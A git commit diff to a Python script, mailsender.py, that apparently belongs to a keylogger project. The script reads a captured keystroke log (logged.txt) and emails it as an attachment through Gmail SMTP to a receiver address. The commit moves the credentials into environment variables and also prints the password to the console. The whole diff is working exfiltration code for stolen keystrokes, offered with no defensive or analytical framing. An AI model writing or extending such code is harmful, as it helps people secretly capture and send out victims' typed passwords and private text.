2765ff344f625843fc7c3d13f994018d7ea33b39
livinNector <livinnector2001@gmail.com>
2023-03-22 11:56:41 +0530

    updated mailsender using load_dotenv

--- mailsender.py
+++ mailsender.py
@@ -2,25 +2,35 @@ import smtplib as sm
 from email.message import EmailMessage
 import tkinter as tk
 from tkinter import messagebox
+import os
+from dotenv import load_dotenv
+
+load_dotenv()
+EMAIL = os.environ["EMAIL"]
+PASSWORD = os.environ["PASSWORD"]
+RECIEVER_MAIL = os.environ["RECIEVER_MAIL"]
+
+print(EMAIL)
+print(PASSWORD)
+print(RECIEVER_MAIL)
 
 def mail_send():
+    
     msg=EmailMessage()
-    msg["from"]="mailid"
-    msg["to"]="rec_mail"
+    msg["from"]=EMAIL
+    msg["to"]=RECIEVER_MAIL
     msg["subject"]="this is the sample program with attacment"
     msg.set_content("mail with attachment!!!")
-    fp=open("F:\ky logger\logged.txt","rb")
+    fp=open("logged.txt","rb")
     data=fp.read()
     msg.add_attachment(data,maintype="text",subtype="octet-stream",filename="log.txt")
     mail=sm.SMTP('smtp.gmail.com',587)
     mail.starttls()
-    mail.login("mailid","passwd")
+    mail.login(EMAIL,PASSWORD)
     # body="helooo"
     try:
-        mail.sendmail("mailid","rec_mail",msg.as_string())
+        mail.sendmail(EMAIL,RECIEVER_MAIL,msg.as_string())
         print("msg sent")
-        root=tk.TK()
-        root.withdraw()
         messagebox.showinfo(title="Success", message="Operation completed successfully.")
     except:
         print("error occured")
